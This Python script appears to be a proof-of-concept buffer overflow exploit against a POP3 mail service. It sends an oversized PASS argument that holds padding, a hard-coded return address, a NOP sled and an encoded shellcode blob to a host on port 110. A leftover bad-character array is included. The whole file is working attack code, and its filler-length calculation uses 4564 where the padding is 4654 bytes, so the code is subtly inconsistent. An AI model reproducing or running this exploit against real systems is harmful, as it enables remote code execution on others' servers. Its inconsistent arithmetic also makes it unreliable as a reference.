import socket
import struct
import sys
import os

#pad's
payload = b"A"*4654
#return address
eip = struct.pack("I",0x5f41422d)
#10 nops to pretect our shell code
nop = b"\x90"*10
#shl = b"\xcc"*500
#bad chars
# \x00\x0a\x0d 
bad = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
bad +=b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
bad +=b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
bad +=b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
bad +=b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
bad +=b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
bad +=b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
bad +=b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
#shell code
buf =  b""
buf += b"\xba\x4a\x45\x39\x4f\xda\xdc\xd9\x74\x24\xf4\x5b\x33"
buf += b"\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\x89\x41\xdb"
buf += b"\xba\xf1\xa2\x99\x45\x09\x33\xfe\xcc\xec\x02\x3e\xaa"
buf += b"\x65\x34\x8e\xb8\x2b\xb9\x65\xec\xdf\x4a\x0b\x39\xd0"
buf += b"\xfb\xa6\x1f\xdf\xfc\x9b\x5c\x7e\x7f\xe6\xb0\xa0\xbe"
buf += b"\x29\xc5\xa1\x87\x54\x24\xf3\x50\x12\x9b\xe3\xd5\x6e"
buf += b"\x20\x88\xa6\x7f\x20\x6d\x7e\x81\x01\x20\xf4\xd8\x81"
buf += b"\xc3\xd9\x50\x88\xdb\x3e\x5c\x42\x50\xf4\x2a\x55\xb0"
buf += b"\xc4\xd3\xfa\xfd\xe8\x21\x02\x3a\xce\xd9\x71\x32\x2c"
buf += b"\x67\x82\x81\x4e\xb3\x07\x11\xe8\x30\xbf\xfd\x08\x94"
buf += b"\x26\x76\x06\x51\x2c\xd0\x0b\x64\xe1\x6b\x37\xed\x04"
buf += b"\xbb\xb1\xb5\x22\x1f\x99\x6e\x4a\x06\x47\xc0\x73\x58"
buf += b"\x28\xbd\xd1\x13\xc5\xaa\x6b\x7e\x82\x1f\x46\x80\x52"
buf += b"\x08\xd1\xf3\x60\x97\x49\x9b\xc8\x50\x54\x5c\x2e\x4b"
buf += b"\x20\xf2\xd1\x74\x51\xdb\x15\x20\x01\x73\xbf\x49\xca"
buf += b"\x83\x40\x9c\x5d\xd3\xee\x4f\x1e\x83\x4e\x20\xf6\xc9"
buf += b"\x40\x1f\xe6\xf2\x8a\x08\x8d\x09\x5d\xf7\xfa\x11\xfa"
buf += b"\x9f\xf8\x11\x05\xdb\x74\xf7\x6f\x0b\xd1\xa0\x07\xb2"
buf += b"\x78\x3a\xb9\x3b\x57\x47\xf9\xb0\x54\xb8\xb4\x30\x10"
buf += b"\xaa\x21\xb1\x6f\x90\xe4\xce\x45\xbc\x6b\x5c\x02\x3c"
buf += b"\xe5\x7d\x9d\x6b\xa2\xb0\xd4\xf9\x5e\xea\x4e\x1f\xa3"
buf += b"\x6a\xa8\x9b\x78\x4f\x37\x22\x0c\xeb\x13\x34\xc8\xf4"
buf += b"\x1f\x60\x84\xa2\xc9\xde\x62\x1d\xb8\x88\x3c\xf2\x12"
buf += b"\x5c\xb8\x38\xa5\x1a\xc5\x14\x53\xc2\x74\xc1\x22\xfd"
buf += b"\xb9\x85\xa2\x86\xa7\x35\x4c\x5d\x6c\x45\x07\xff\xc5"
buf += b"\xce\xce\x6a\x54\x93\xf0\x41\x9b\xaa\x72\x63\x64\x49"
buf += b"\x6a\x06\x61\x15\x2c\xfb\x1b\x06\xd9\xfb\x88\x27\xc8"
#send our payload to target
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.0.105',110))
print("Sending Evil Payload!!!")
s.send(b"USER username\r\n")
s.send(b"PASS "+payload+eip+nop+buf+b"C"*(5000-len(buf)-4564-4)+b"\r\n")
print(s.recv(1024).decode())

